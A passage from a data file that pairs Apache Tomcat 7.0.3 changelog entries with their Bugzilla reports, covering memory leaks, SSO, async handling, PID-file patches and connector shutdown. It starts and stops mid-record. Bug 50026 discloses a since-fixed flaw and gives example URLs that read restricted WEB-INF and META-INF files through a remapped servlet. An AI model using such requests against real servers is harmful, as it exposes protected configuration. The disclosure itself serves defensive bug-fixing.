for CmdAndArgs"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49657
Catalina|Tomcat 7.0.3 (markt)|fix|49667|Ensure that using the JDBC driver memory leak prevention code does not cause a one of the memory leaks it is meant to avoid. (markt)|JdbcLeakPrevention class can register unregistered JCBC Driver|"Overview
Suppose there is an web application A that uses a database and registers a Driver with the java.sql.DriverManager, and a web application B that doesn't use a database but has a jar file in its WEB-INF/lib directory that contains the same Driver. Suppose you undeploy web application B.
Running the org.apache.catalina.loader.JdbcLeakPrevention class will actually register the Driver and leave it loaded! The cause is the way the DriverManager checks whether a ClassLoader has permission to load the Driver. It does that by calling Class.forName with the ClassLoader, which will load the class if the class has not been loaded by that ClassLoader. Loading a Driver class triggers the Driver to register itself. 

Steps to reproduce
Create two web applications: one which registeres a Driver with the java.sql.Drivermanager and one that uses no database. Put the jar containing the Driver class in the WEB-INF/lib directory of both applications. Deploy both in Tomcat. Then undeploy the latter one.
Inspect catalina.out, verify that there are no messages about a JDBC Driver being forcibly unregistered.
Create a memory dump using jmap and inspect the dump using jhat.

Actual results
The WebappClassLoader for the latter application is still present. Its ""rootset references"" page shows two reference chains from class java.sql.DriverManager:
Static reference from java.sql.DriverManager.readDrivers (from class java.sql.DriverManager) :
--> java.util.Vector@0xeb6eb3f0 (24 bytes) (field elementData:)
--> [Ljava.lang.Object;@0xeb6eb408 (20 bytes) (Element 2 of [Ljava.lang.Object;@0xeb6eb408:)
--> java.sql.DriverInfo@0xeb6eb420 (20 bytes) (field driverClass:)
--> class oracle.jdbc.driver.OracleDriver (84 bytes) (??:)
--> org.apache.catalina.loader.WebappClassLoader@0xeb5a84a0 (157 bytes) 

and a similar one from java.sql.DriverManager.writeDrivers.

Expected results
The WebappClassLoader is not present in memory anymore.

Build date & platform
Downloaded Core tar.gz from http://tomcat.apache.org/download-70.cgi"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49667
Catalina|Tomcat 7.0.3 (markt)|fix|49670|Restore SSO functionality that was broken by Lifecycle refactoring. (markt)|org.apache.catalina.authenticator.SingleSignOn valve does not function|"I have two web applications; neither declare a realm in the context.xml and both are configured for authentication in the web.xml using standard tomcat authentication methods.  I have enabled the tomcat valve in the host and have added a realm to the host as well.

      <Host name=""localhost""  appBase=""webapps"" unpackWARs=""true"" autoDeploy=""true"">
      	<Realm className=""org.apache.catalina.realm.JAASRealm"" appName=""SSO"" userClassNames=""a.b.c"" roleClassNames=""a.b.c"" useContextClassLoader=""false""/>
        <!-- SingleSignOn valve, share authentication between web applications
             Documentation at: /docs/config/valve.html -->
        <Valve className=""org.apache.catalina.authenticator.SingleSignOn""/>
        <!-- Access log processes all example.
             Documentation at: /docs/config/valve.html -->
        <!--
        <Valve className=""org.apache.catalina.valves.AccessLogValve"" directory=""logs""  
               prefix=""localhost_access_log."" suffix="".txt"" pattern=""common"" resolveHosts=""false""/>
        -->

I have added a jaas configuration for the SSO app in the jaas.conf file for the server.  I am certain that the realm, jaas.conf are all configured properly as the web applications do require a user to authenticate before accessing the application, but if I have authenticated to one application I still am required to authenticate before accessing the other application.

I have this exact same configuration working on a tomcat 6 environment, but an identical configuration will not operate on a tomcat 7 server."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49670
Catalina|Tomcat 7.0.3 (markt)|fix|49698|Allow a listener to complete an asynchronous request if it times out. (markt)|AsyncContext timeout always return http 500|Whatever asynclistener timeout call complete response always return http 500.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49698
Catalina|Tomcat 7.0.3 (markt)|fix|49714|The annotation process of Jar doesn't influence distributable element of web.xml. (kfujino)|The annotation process of Jar should not impact distributable of web.xml.|"Even if < distributable/> is set to web.xml(servlet3.0), 
distributable is changed from true to false by the annotation process of JAR. 

ContextConfig#processAnnotations is as follows. 
===ContextConfig#processAnnotations
protected void processAnnotations(Set<WebXml> fragments) {
    for(WebXml fragment : fragments) {
        if (!fragment.isMetadataComplete()) {
            WebXml annotations = new WebXml();
            URL url = fragment.getURL();
            processAnnotationsUrl(url, annotations);
            Set<WebXml> set = new HashSet<WebXml>();
            set.add(annotations);
            // Merge annotations into fragment - fragment takes priority
            fragment.merge(set);
        }
    }
}
===
distributable of ""annotations"" created by new WebXml() is false (default). 
If ""annotations"" is merged with ""fragment"", distributable of ""fragment"" becomes false. 

Because ""fragment"" is merged with web.xml of the web application,
even if < distributable/> is set to web.xml, distributable is changed from true to false. 

The following are necessary. 
annotations.setDistributable(true);

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49714
Catalina|Tomcat 7.0.3 (markt)|fix|49721|Alls JAR in a web application should be searched for resources, not just those with a web-fragment.xml that is going to be processed. (markt)|Fail to access the resources such as jsp files from a jar file which is supported by servlet 3.0|I put a jsp file in a jar file and test whether tomcat 7 supports it by viewing it from the browser and failed.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49721
Catalina|Tomcat 7.0.3 (markt)|fix|49728|Improve PID file handling when another process is managing the PID file and Tomcat does not have write access. (markt)|catalina.sh PID file handling not working if started by initscript|"the PID file handling was changed in 6.0.24 in catalina.sh, which avoid the use of an initscript to start tomcat proper (e.g. on CentOS/RHEL5). catalina.sh is currently too strict regarding existing PID file and has imho a too lightweight check.

Below is a patch which improves the PID file handling.

It fixes 2 issues.

Issue 1: tomcat won't start, if initscript has already created as root a PID file and changed permissions, that user tomcat would able to write it's PID into this file.

Fix: check existing PID file whether it's non-empty and if yes, check, whether PID is stale

Issue 2: catalina.sh unconditionally tries to remove the given PID file, not testing the case that it has no write access to the directory (e.g. /var/run).

Fix: check before removing a PID file (because this needs write access to pid file directory, which is e.g. /var/run, were user tomcat has no write access)

Pls. include this fix into upstream, thank you.

  Peter

--- catalina.sh 2010-07-19 12:59:45.000000000 +0000
+++ catalina.sh 2010-08-09 13:00:56.000000000 +0000
@@ -311,9 +311,15 @@
elif [ ""$1"" = ""start"" ] ; then

  if [ ! -z ""$CATALINA_PID"" ]; then
-    if [ -f ""$CATALINA_PID"" ]; then
-      echo ""PID file ($CATALINA_PID) found. Is Tomcat still running? Start aborted.""
-      exit 1
+    if [ -f ""$CATALINA_PID"" -a -s ""$CATALINA_PID"" ]; then
+      echo ""Non-empty PID file ($CATALINA_PID) found. Is Tomcat still running?""
+      pid=""`cat ""$CATALINA_PID""`""
+      if ps -p $pid >/dev/null; then
+        echo ""Tomcat is probably still running with PID $pid! Start aborted.""
+        exit 1
+      else
+        echo ""Tomcat is no longer running (stale PID file).""
+      fi
    fi
  fi

@@ -393,7 +399,11 @@
      while [ $SLEEP -ge 0 ]; do
        kill -0 `cat $CATALINA_PID` >/dev/null 2>&1
        if [ $? -gt 0 ]; then
-          rm $CATALINA_PID
+          if [ -w `dirname ""$CATALINA_PID""` ]; then
+            rm $CATALINA_PID
+          else
+            echo ""Non-removable PID file found ($CATALINA_PID).""
+          fi
          break
        fi
        if [ $SLEEP -gt 0 ]; then
@@ -416,7 +426,11 @@
      if [ -f ""$CATALINA_PID"" ]; then
        echo ""Killing: `cat $CATALINA_PID`""
        kill -9 `cat $CATALINA_PID`
-        rm $CATALINA_PID
+        if [ -w `dirname ""$CATALINA_PID""` ]; then
+          rm $CATALINA_PID
+        else
+          echo ""Non-removable PID file found ($CATALINA_PID).""
+        fi
      fi
    fi
  fi"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49728
Catalina|Tomcat 7.0.3 (markt)|fix|49730|Fix a race condition in StandardThreadExector that can cause requests to experience large delays. Patch provided by Sylvain Laurent. (markt)|Race condition in StandardThreadExecutor : requests are sometimes enqueued instead of creating new threads|"In tomcat 6, I often configure an Executor with minSpareThreads=0 to work around memory leak issues upon redeployment.

Sometimes (especially in development), when I refresh a page of my webapp with Safari, Chrome or Firefox, some resources of the page take several seconds (>10s) to be served though they are static resources and should come in less than 50ms. For instance, over 15 requests for a page (1 for html, the others for resources like js, css, images...), I sometimes have 1 or 2 that take >10s. 

After analysis, I found that in org.apache.catalina.core.StandardThreadExecutor.TaskQueue.offer(Runnable) the statement 
if (parent.getActiveCount()<(parent.getPoolSize()))
is sometimes true unexpectedly. Here is the scenario :

- ThreadPoolExecutor is empty
- the user refreshes the page (or accesses it with an empty cache) in his web browser for a page that uses a more than 10-15 resources
- the browser establishes one TCP connection and a new Thread is created
- after the browser receives the response, it decides to load as many resources as possible in parallel. For this it establishes up to 6 TCP connections (in my tests)
- The Acceptor thread calls StandardThreadExecutor.execute to process each incoming connection.
- For each call, StandardThreadExecutor.TaskQueue.offer(Runnable) is being called
- if you study the sources of Java 6 ThreadPoolExecutor, you can see that there's a small delay between the time a new Thread is created (thus increasing poolSize) and the time it starts working on its first task (increasing the activeCount)
- Since in my case connections are established in a rapid burst, the calls to TaskQueue.offer() are sometimes faster than this small delay, so that we do have parent.getActiveCount()<parent.getPoolSize() and thus the task is enqueued instead of forcing the creation of a thread to serve it.
- Since Keep-Alive is enabled and tomcat 6 threads take care of only one TCP connection at a time, the requests in the queue must wait for the keep-alive timeout so that a Thread is returned to the pool to serve pending tasks.
- With 25s keepAliveTimeOut, it means that some requests take more than 25s to be served eventhough the pool was never full and the server quite idle!!!

Other facts about this issue :
- Although my test case starts with an empty pool, it can occur even on a loaded server. The thing that triggers the issue is the burst of new TCP connections.
- The problem is less severe with a lower keepAliveTimeout, or if keepalive is disabled. In any case, it also depends on the time taken to serve current requests.
- The issue also affects tomcat 7 but is less severe because tc7 threads are returned to the pool after each http request, even if the TCP connection is kept alive. The impact would the same as with tc6 with keepAlive disabled."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49730
Catalina|Tomcat 7.0.3 (markt)|fix|49749|Single sign on cookies should have httpOnly flag set using same rules as session cookies. (markt)|SSO cookie should be added as HttpOnly|"SSO cookies should be made HttpOnly by default.

In org.apache.catalina.authenticator.AuthenticatorBase#register(), 

798- response.addCookie(cookie);
798+ response.addCookieInternal(cookie, true);"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49749
Catalina|Tomcat 7.0.3 (markt)|fix|49750|Align WebappClassLoader.validate() implementation with Javadoc and ensure that javax.servlet.* classes can not be loaded by a WebappClassLoader instance. Patch provided by pid. (markt)|WebappClassLoader.validate(name) does not validate javax.servlet.|"The method does not validate the class name as described in the method documentation.

""Validate a classname. As per SRV.9.7.2, we must restrict loading of classes from J2SE (java.*) and classes of the servlet API (javax.servlet.*) """|https://bz.apache.org/bugzilla/show_bug.cgi?id=49750
Catalina|Tomcat 7.0.3 (markt)|fix|49757|Correct some generics warnings. Based on a patch provided by G√°bor. (markt)|correcting some generics related warnings|Patch attached. Thanks|https://bz.apache.org/bugzilla/show_bug.cgi?id=49757
Catalina|Tomcat 7.0.3 (markt)|fix|49779|Improve handling of POST requests and FORM authentication, particularly when the user agent responds to the 302 response by repeating the POST request including a request body. Any request body provided at this point is now swallowed. (markt)|501 Method not implemented with successive POST requests|"Created attachment 25911 [details]
client wire/context log, client code, webapp code

An unexpected HTTP 501 occurs if using HttpComponents with successive POST requests against a simple Tomcat 7 servlet (Form-based POST Authentication is enabled). After a sucessfull authentication, the client requests the same protected resource a few times in a row, but the second request always returns a ""501 Method not implemented"" status. All other requests succeed.

The following communication takes place:
1. Client requests a protected resource; Tomcat returns the login page (HTTP200)
2. Client provides the user credentials and calls the login resource; Tomcat returns a redirect (HTTP302)
3. Client sets the location from the redirect for the next request(identical to URI from #1) and requests it; Tomcat returns the page (HTTP200)
4. Client requests the same resource again; Tomcat returns a HTTP501 - Method not implemented
5. Client requests the same resource again; Tomcat returns the page (HTTP200)
6. Client requests the same resource again; Tomcat returns the page (HTTP200)
7. Client requests the same resource again; Tomcat returns the page (HTTP200)

The access log message regarding the 501 says:
'""testName=testValuePOST /test/secure/ HTTP/1.1"" 501 1278', which may indicate that the entity data and the HTTP-method name somehow got mixed up!? Strangely the HTTP501 does not appear in case of a JSP for the requested resource, only if facing a form-based POST authentication Servlet. The servlet does only implement post and get(which calls the doPost) and returns just a string. The client code should be fine since I already posted this issue on the HTTPComponents mailing list and the data sent over the wire seems to be right. 

I attached the source/bin of the testclient and webapp and also the wire/context log of the client.

How can I provide further helpfull information?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49779
Catalina|Tomcat 7.0.3 (markt)|fix||CSRF prevention filter did not correctly handle URLs that used anchors. (markt)|||
Catalina|Tomcat 7.0.3 (markt)|fix||Fix memory leak on web application stopped caused by failed to de-register the web application's Servlets with the MBean server. (markt)|||
Catalina|Tomcat 7.0.3 (markt)|update||More tweaks to the Lifecycle refactoring to ensure that when a component is being destroyed, the destroy method is only called once on each child component. (markt)|||
Catalina|Tomcat 7.0.3 (markt)|fix||Keep the MBean names for web applications consistent between Tomcat 6 and Tomcat 7. (markt)|||
Catalina|Tomcat 7.0.3 (markt)|fix|49856|Add an executorName attribute to Connectors so it is possible to trace ThreadPool to Connector to Executor via the JMX interface. (markt)|Connector/ThreadPool link to Executor not exposed via JMX|When viewing either Connector objects or ThreadPool objects via JMX the name of the executor is not shown. It would be helpful if this were exposed via JMX so the links between Connectors/ThreadPools and Executors could be determined.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49856
Catalina|Tomcat 7.0.3 (markt)|fix|49865|Tomcat failed to start if catalina.properties was not present. (markt)|ExceptionUtils throw NoClassDefFoundError during startup|"Remove conf/catalina.properties and get:

SEVERE: Class loader creation threw exception
java.lang.NoClassDefFoundError: org/apache/tomcat/util/ExceptionUtils
        at org.apache.catalina.startup.CatalinaProperties.loadProperties(CatalinaProperties.java:112)
        at org.apache.catalina.startup.CatalinaProperties.<clinit>(CatalinaProperties.java:52)
        at org.apache.catalina.startup.Bootstrap.createClassLoader(Bootstrap.java:110)
        at org.apache.catalina.startup.Bootstrap.initClassLoaders(Bootstrap.java:93)
        at org.apache.catalina.startup.Bootstrap.init(Bootstrap.java:207)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:392)
Caused by: java.lang.ClassNotFoundException: org.apache.tomcat.util.ExceptionUtils
        at java.net.URLClassLoader$1.run(URLClassLoader.java:200)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:188)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:303)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:248)
        at java.lang.ClassLoader.loadClassInternal(ClassLoader.java:316)

org.apache.tomcat.util.ExceptionUtils is not available for the class loader during this early stage.

Observed in r991965, added TODO marks in CatalinaProperties.java."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49865
Catalina|Tomcat 7.0.3 (markt)|fix|49876|Fix the generics warnings in the copied Apache Jakarta BCEL code. Based on a patch by G√°bor. (markt)|correcting generics related compile warning in org/apache/tomcat/util/bcel/classfile files|"Explanation:

Several files have compile time generics related warnings displayed for org/apache/tomcat/util/bcel/classfile. This patch cleans up several of those warnings."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49876
Catalina|Tomcat 7.0.3 (markt)|fix|49883|Ensure that the CombinedRealm and LockOutRealm return a name for use in log messages rather than throwing an UnsupportedOperationException. (markt)|java.lang.UnsupportedOperationException: The getName() method should never be called|"Hi, I am running Tomcat trunk (revision 992708, 2010-09-03). I added this line to conf/logging.properties:

org.apache.catalina.level=FINEST

The server fails to start with:

Throwable occurred: java.lang.UnsupportedOperationException: The getName() method should never be called
	at org.apache.catalina.realm.CombinedRealm.getName(CombinedRealm.java:268)
	at org.apache.catalina.realm.RealmBase.toString(RealmBase.java:1015)
	at java.text.MessageFormat.subformat(MessageFormat.java:1258)
	at java.text.MessageFormat.format(MessageFormat.java:807)
	at org.apache.tomcat.util.res.StringManager.getString(StringManager.java:152)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:320)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:305)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:98)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:131)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1020)
	at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:276)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:429)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:649)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:584)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:48)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:600)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:416)
java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:48)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:600)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:416)
Caused by: java.lang.UnsupportedOperationException: The getName() method should never be called
	at org.apache.catalina.realm.CombinedRealm.getName(CombinedRealm.java:268)
	at org.apache.catalina.realm.RealmBase.toString(RealmBase.java:1015)
	at java.text.MessageFormat.subformat(MessageFormat.java:1258)
	at java.text.MessageFormat.format(MessageFormat.java:807)
	at org.apache.tomcat.util.res.StringManager.getString(StringManager.java:152)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:320)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:305)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:98)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:131)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1020)
	at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:276)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:429)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:649)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:584)
	... 6 more


If I comment out that line in logging.properties, the server starts fine. Looking at the code in LifecycleBase line 320, it is a log.debug call:

        if (log.isDebugEnabled()) {
            log.debug(sm.getString(""lifecycleBase.setState"", this, state));
        }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49883
Catalina|Tomcat 7.0.3 (markt)|fix|49884|Fix occasional NullPointerException on async complete(). This resulted in a major refactoring of the async implementation to address a number of threading issues. (markt)|NullPointerException in org.apache.catalina.core.AsyncContextImpl.doInternalComplete|"Hi, I'm running Tomcat trunk (revision 992708, 2010-09-03) and I'm hitting an async servlet (see attached) with Apache Bench, and every once in a while I see a NullPointerException in org.apache.catalina.core.AsyncContextImpl.doInternalComplete:

Sep 4, 2010 8:09:39 PM org.apache.catalina.core.AsyncContextImpl doInternalDispatch
FINE: TIMING OUT!
Sep 4, 2010 8:09:40 PM org.apache.catalina.core.AsyncContextImpl doInternalDispatch
FINE: TIMING OUT!
Sep 4, 2010 8:09:40 PM org.apache.catalina.core.AsyncContextImpl doInternalComplete
SEVERE: 
Throwable occurred: java.lang.NullPointerException
	at org.apache.catalina.core.AsyncContextImpl.doInternalComplete(AsyncContextImpl.java:384)
	at org.apache.catalina.core.AsyncContextImpl.doInternalDispatch(AsyncContextImpl.java:327)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:238)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:201)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:163)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:108)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:557)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:301)
	at org.apache.coyote.http11.Http11Processor.asyncDispatch(Http11Processor.java:333)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:258)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:257)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:898)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:920)
	at java.lang.Thread.run(Thread.java:736)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49884
Catalina|Tomcat 7.0.3 (markt)|fix||Update the version numbers in ServerInfo defaults to Tomcat 7.0.x. (markt)|||
Catalina|Tomcat 7.0.3 (markt)|fix|49892|Correct JNDI name for method resource injections. Based on a patch by Gurkan Erdogdu. (markt)|Wrong JNDI Name for Method Resource Injections|Method based JNDI env. injections not worked correctly. Patch is attached. See Java EE 6 specification section, EE. 5.2.5 Annotations and Injections. Patch is provided that solves problem.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49892
Catalina|Tomcat 7.0.3 (markt)|fix||Ensure that Context elements defined in server.xml use any configClass setting specified in the parent Host element. (markt)|||
Catalina|Tomcat 7.0.3 (markt)|fix||GSOC 2010. Enable the creation of Services, Engines, Connectors, Hosts and Contexts via JMX from a minimal server.xml that contains only a Server element. Based on a patch by Chamith Buddhika. (markt)|||
Catalina|Tomcat 7.0.3 (markt)|fix|49909|Fix a regression introduced with the fix for 47950 that prevented JSTL classes being loaded. (markt)|jstl 1.2 not support|"Created attachment 26011 [details]
run log

I get the R995577 from svn, and complied.
Report err when run my webapp that lib include jstl.jar v1.2.
But run the examples with jstl.jar v1.1.2 and standard.jar v1.1.2 was work fined.

Is the tc7 not support jstal 1.2?

The exception stack in the attachment."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49909
Catalina|Tomcat 7.0.3 (markt)|fix|49915|Make error more obvious, particularly when accessed via JConsole, if StandardServer.storeConfig() is called when there is no StoreConfig implementation present. (markt)|[Patch] o.a.c.c.StandardServer swallows error on storeConfig.|"When o.a.c.c.StandardServer#storeConfig is called all exceptions were getting swallowed. 

This lead to the impresssion it was working correctly when saved either through the manager application /manager/save or through jconsole.

I've removed the catch throwable block and thrown an exception upon not finding the registerd MBean."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49915
Catalina|Tomcat 7.0.3 (markt)|fix|50018|Fix some minor Javadoc errors in Jasper source. Based on a patch by sebb. (timw)|Javadoc corrections|"Created attachment 26092 [details]
Javadoc corrections"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50018
Catalina|Tomcat 7.0.3 (markt)|fix|50021|Correct a regression in the fix for 46844 that may have caused additional problems during a failure at start up. (markt)|ExceptionUtils class missing from bootstrap.jar|"o.a.c.startup.Bootstrap uses o.a.jasper.util.ExceptionUtils, but this class is not placed in bootstrap.jar, causing rather nasty failures if anything goes wrong during initial bootstrapping.

This should be a fairly simple matter of updating build.xml to include it, but I wasn't sure whether including Jasper classes in the bootstrap was the done thing.
There's an o.a.tomcat.util.ExceptionUtils that is identical, but that too looks like the wrong thing to grab."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50021
Catalina|Tomcat 7.0.3 (markt)|fix|50026|Prevent serving of resources from WEB-INF and META-INF directories when DefaultServlet or WebdavServlet is mapped to a sub-path of the context. This changes DefaultServlet to always serve resources with paths relative to the root of the context regardless of where it is mapped, which is a breaking change for current servlet-mappings that map the default servlet to a subpath. (timw)|DefaultServlet serves META-INF and WEB-INF from root when remapped on /folder/*|"The following in web.xml

    <servlet>
        <servlet-name>static</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>static</servlet-name>
        <url-pattern>/static/*</url-pattern>
    </servlet-mapping>

makes restricted folders accessible by e.g.

http://localhost:8080/context/static/WEB-INF/web.xml
http://localhost:8080/context/static/META-INF/MANIFEST.MF"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50026
Catalina|Tomcat 7.0.3 (markt)|fix|50689|Provide 100 Continue responses at appropriate points during FORM authentication if client indicates that they are expected. (markt)|FormAuthenticator does not respond properly to 'Expect: 100-Continue' header|"Hi guys,

First, thank you for creating Tomcat! I've used it over and over again for more than a decade and it's been a wonderful help to me.

I've been tracking a bug in my app which seemed like a bug in HttpClient and now (according to the HttpClient guys) appears to be a bug in Tomcat.

Details of the bug, including analysis and test case, attached here:

   https://issues.apache.org/jira/browse/HTTPCLIENT-1048

Essentially if FormAuthenticator receives an HTTP request containing a 'Expect: 100-Continue' header, it is meant to respond with either a 100 or a 417 in order to request the body of the request. But instead, Tomcat is not responding at all. Luckily a 'fallback' use case of the spec is that the client should wait, say, 2 seconds then send the body anyway.

The result is that logging in takes much longer (2 longers versus 10ms) than expected, which can be a problem for people doing automated testing against FormAuthenticator.

Note the issue may affect use cases beyond FormAuthenticator too.

Regards,

Richard."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50689
Coyote|Tomcat 7.0.3 (markt)|update||Wait for the connectors to exit before closing them down. (mturk)|||
Coyote|Tomcat 7.0.3 (markt)|add||Follow up to 48545. Make JSSE connectors more tolerant of a incorrect trust store password. (markt)|truststorePass used in JSSESocketFactory should be optional (nillable)|"Created attachment 24845 [details]
Patched JSSESocketFactory.java based on Tomcat 6.0.20

For the moment, a user must set the ""truststorePass"" in the SSL connector, even if this is not required by the JSEE API (Keystore.load() with null password is possible for truststores) and is also unwanted in a production environment with ""real"" truststores, because this may give someone the possibility to manipulate a productive trustore file or give more information than needed.
If the ""truststorePass"" is not set in the connector element, the current implementation will use the ""keystorePass"" as the value for ""truststorePass"" (strange wrong behaviour) and this will lead to an exception.
Proposal: do not set the ""truststorePass"" if omitted, leave it with null and the SSL connector still works.
This should also not affect old tomcat configurations, where the truststore password equals to the keystore password.
See my attached JSSESocketFactory patch (based on 6.0.20)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48545
Coyote|Tomcat 7.0.3 (markt)|fix||Fix some edge cases in the NIO connector when handling requests that are not received all at the same time and the socket needs to be returned to the poller. (markt)|||
Coyote|Tomcat 7.0.3 (markt)|update||Further work to reduce the code duplication in the HTTP connectors. (markt)|||
Coyote|Tomcat 7.0.3 (markt)|fix||Make sure acceptor threads are stopped when the connector is stopped. (markt)|||
Coyote|Tomcat 7.0.3 (markt)|fix||Make sure async timeout thread is stopped when the connector is stopped. (markt)|||
Coyote|Tomcat 7.0.3 (markt)|fix|49625|Ensure Vary header is set if response may be compressed rather than only setting it if it is compressed. (markt)|Tomcat doesn't send Vary consistently when gzip enabled|"HTTP requires that the Vary response header be sent consistently for all responses if they change based upon different aspects of the request.
My pages has both compressed and uncompressed variants available, negotiated by the Accept-Encoding request header, but it sends different Vary headers for each;

""accept-encoding"" when the response is compressed, and
"""" when it is not.
This can cause problems for downstream caches, because they cannot consistently determine what the cache key for a given URI is.

My server.xml content:
  <Service name=""Catalina"">
  
    <Connector port=""8080"" proxyPort=""80"" maxHttpHeaderSize=""8192"" protocol=""org.apache.coyote.http11.Http11Protocol"" 
    maxThreads=""200"" minSpareThreads=""25"" maxPostSize=""8"" 
    maxSpareThreads=""75"" enableLookups=""false"" keepAliveTimeout=""3000"" maxKeepAliveRequests=""100""
    redirectPort=""8443"" acceptCount=""100""
    connectionTimeout=""8000"" disableUploadTimeout=""true""
    compression=""on"" compressionMinSize=""2048""
    compressableMimeType=""text/html,text/xml,text/javascript,text/css"" />
    
    <Engine name=""Catalina"" defaultHost=""localhost"">
        <Host name=""localhost"" appBase=""webapps"" unpackWARs=""false"" autoDeploy=""false""
debug=""0""
            xmlValidation=""false"" xmlNamespaceAware=""false"">
	</Host>
    </Engine>
  </Service>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49625
Coyote|Tomcat 7.0.3 (markt)|fix|49802|Re-factor connector pause, stop and destroy methods so that calling any of those methods has the expected results. (markt)|Shutdown of AJP Connector do not work|"Created attachment 25927 [details]
Catalina log

Hi, 
  when Tomcat is under load from an Apache httpd server (through mod_jk and ajp13) and I shutdown it, I get NullPointerException:

^C
23-ago-2010 11.06.47 org.apache.coyote.http11.AbstractHttp11Protocol pause
INFO: Pausing Coyote HTTP/1.1 on http-9080
23-ago-2010 11.06.47 org.apache.coyote.ajp.AjpProtocol pause
INFO: Pausing Coyote AJP/1.3 on ajp-9009
23-ago-2010 11.06.48 org.apache.catalina.core.StandardService stopInternal
INFO: Stopping service Catalina
23-ago-2010 11.06.48 org.apache.catalina.connector.CoyoteAdapter service
GRAVE: An exception or error occurred in the container during the request processing
java.lang.NullPointerException
        at org.apache.catalina.connector.CoyoteAdapter.postParseRequest(CoyoteAdapter.java:638)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:397)
        at org.apache.coyote.ajp.AjpProcessor.process(AjpProcessor.java:450)
        at org.apache.coyote.ajp.AjpProtocol$AjpConnectionHandler.process(AjpProtocol.java:385)
...

I think the stopping of the Coyote AJP Connector doesn't work. In fact, if you go with jconsole on MBean Catalina->Connector->8009 and do ""Stop"" on ""operation tab"", nothing happens.

To reproduce this bug:
